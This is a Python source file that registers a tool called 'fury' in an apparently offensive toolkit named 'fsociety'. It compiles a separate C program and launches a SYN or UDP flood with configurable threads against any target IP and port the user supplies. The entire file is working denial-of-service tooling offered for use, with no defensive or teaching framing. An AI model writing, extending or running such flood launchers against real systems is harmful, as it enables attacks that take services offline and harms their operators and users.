from __future__ import annotations
import os
import shutil
import subprocess
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

@tool("fury", "Raw C-based SYN/UDP flood (Extreme PPS)", category="dos")
class Fury:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Target IP")
        p.add_argument("port", type=int, help="Target port")
        p.add_argument("--threads", type=int, default=8, help="Number of threads")
        p.add_argument("--mode", default="syn", choices=["syn", "udp"], help="Attack mode")

    @staticmethod
    def run(args, log: Log) -> int:
        if os.geteuid() != 0:
            log.err("Raw socket execution requires root.")
            return 1

        src = Path(__file__).parent / "fury.c"
        bin_path = Path(__file__).parent / "fury_bin"

        if not src.exists():
            log.err(f"Source missing: {src}")
            return 1

        if not bin_path.exists():
            log.info("Compiling fury.c...")
            if not shutil.which("gcc"):
                log.err("gcc not installed.")
                return 1
            proc = subprocess.run(["gcc", "-O3", "-pthread", str(src), "-o", str(bin_path)])
            if proc.returncode != 0:
                log.err("Compilation failed.")
                return 1

        cmd = [str(bin_path), args.target, str(args.port), str(args.threads), args.mode]
        log.info(f"Executing fury on {args.target}:{args.port} ({args.mode.upper()}, {args.threads} threads)")
        try: subprocess.run(cmd)
        except KeyboardInterrupt: log.warn("Attack interrupted.")
        return 0
